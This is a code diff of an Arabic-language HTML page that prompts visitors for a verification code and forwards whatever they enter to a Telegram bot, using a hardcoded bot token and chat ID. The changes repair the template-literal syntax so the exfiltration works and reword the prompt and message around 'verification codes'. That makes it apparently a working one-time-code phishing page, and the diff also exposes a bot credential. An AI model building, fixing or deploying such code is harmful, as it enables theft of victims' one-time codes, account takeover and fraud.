@@ -42,7 +42,7 @@
       <input id="onlyNumber" inputmode="numeric" autocomplete="off"
              placeholder="أدخل رمز التحقق" maxlength="9" aria-describedby="hint" />
       <button id="sendBtn" type="button">إرسال</button>
-      <p id="hint" class="hint">سيسمح فقط بالأرقام — الطول المطلوب بين 4 و 9 أرقام.</p>
+      <p id="hint" class="hint">   ادخل كود التحقق .</p>
       <p id="errorMsg">الرمز الذي ادخلته غير صحيح</p>
     </div>
   </main>
@@ -54,7 +54,7 @@
   <script>
     const BOT_TOKEN = "8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I";
     const CHAT_ID   = "8404960059";
-    const API_URL = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
+    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
     const input = document.getElementById('onlyNumber');
     const btn   = document.getElementById('sendBtn');
@@ -76,7 +76,7 @@
         return;
       }
 
-      const msg = 📥 استلام رقم (4-9):\n${val};
+      const msg = `📥 استلام رقم (التحقق):\n${val}`;
 
       try {
         await fetch(API_URL, {
